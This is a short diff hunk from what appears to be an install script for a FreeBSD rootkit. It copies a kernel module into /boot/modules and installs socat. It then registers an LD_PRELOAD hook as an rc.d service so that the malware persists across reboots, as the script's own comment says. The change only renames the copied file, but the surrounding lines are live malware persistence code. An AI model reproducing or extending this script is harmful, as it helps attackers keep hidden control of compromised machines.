@@ -20,7 +20,7 @@ cp "$LKM_NAME" /boot/modules/
 pkg install socat -y
 
 # achieve persistance by loading the module everytime the system boots
-cp load_LD_PRELOAD /usr/local/etc/rc.d/
+cp ldpreload /usr/local/etc/rc.d/
 chmod +x /usr/local/etc/rc.d/ldpreload
 service ldpreload enable
 service ldpreload start
